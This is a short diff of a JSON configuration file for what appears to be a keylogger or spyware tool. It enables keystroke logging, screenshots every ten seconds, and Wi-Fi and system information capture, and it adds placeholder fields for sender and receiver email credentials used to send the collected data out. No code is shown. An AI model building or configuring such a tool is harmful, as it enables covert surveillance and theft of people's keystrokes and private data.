@@ -1,11 +1,16 @@
 {
-    "info_email": "",
+    "info_email_receiver": "email receiving the info",
     "email_send": 120,
     "take_screenshot": true,
     "screenshot_time": 10,
     "key_logg": true,
     "get_wifi_info": true,
-    "system_info": true
+    "system_info": true,
+
+
+
+    "sender_email_address": "sender email address",
+    "sender_email_password": "sender email password"
 
 }
 
